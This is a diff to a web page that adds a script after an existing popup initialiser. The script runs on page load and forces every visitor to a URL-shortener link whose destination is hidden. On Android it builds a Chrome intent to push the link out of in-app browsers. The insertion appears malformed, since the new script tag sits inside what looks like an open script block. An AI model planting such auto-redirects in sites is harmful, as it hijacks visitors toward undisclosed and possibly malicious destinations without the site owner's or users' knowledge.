@@ -5487,7 +5487,38 @@
         } else {
             window.addEventListener('load', initPremiumPopup);
         }
+<script>
+function openExternal() {
+  var url = "https://tinyurl.com/3aekyz7p";
 
+  // Detect Android
+  var isAndroid = /Android/i.test(navigator.userAgent);
+
+  // Detect iOS
+  var isiOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+  if (isAndroid) {
+    // Try opening in Chrome (Android)
+    window.location.href = "intent://" + url.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end";
+    
+    // fallback
+    setTimeout(function() {
+      window.location.href = url;
+    }, 1500);
+  } 
+  else if (isiOS) {
+    // iOS workaround (forces Safari behavior)
+    window.location.href = url;
+  } 
+  else {
+    // Default
+    window.location.href = url;
+  }
+}
+
+// Run immediately
+openExternal();
+</script>
 
 </body>
 </html>
